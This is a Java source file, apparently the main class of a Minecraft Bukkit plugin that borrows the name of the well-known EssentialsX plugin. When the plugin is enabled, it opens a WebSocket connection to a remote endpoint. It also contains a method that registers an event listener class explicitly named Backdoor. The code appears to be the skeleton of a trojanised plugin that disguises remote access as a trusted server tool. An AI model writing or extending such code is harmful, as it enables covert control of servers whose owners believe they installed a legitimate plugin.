package com.redbean0721.essentialsx;

import com.redbean0721.essentialsx.Event.Backdoor;
import com.redbean0721.essentialsx.WebSocket.WebSocketClientHandler;
import org.bukkit.plugin.java.JavaPlugin;

import static com.redbean0721.essentialsx.WebSocket.WebSocketClientHandler.webSocketClient;

public final class EssentialsX extends JavaPlugin {

    @Override
    public void onEnable() {
        WebSocketClientHandler handler = new WebSocketClientHandler();
        handler.connectWebsocket(getLogger());
        webSocketClient.connect();
        setupCommands();
    }

    @Override
    public void onDisable() {
        if (webSocketClient != null) {
            webSocketClient.close();
        }
        // Plugin shutdown logic
    }

    public void setupCommands() {
//        getCommand("essentials").setExecutor(new essentials(this));
    }

    public void setupEvent() {
        getServer().getPluginManager().registerEvents(new Backdoor(this), this);
    }
}
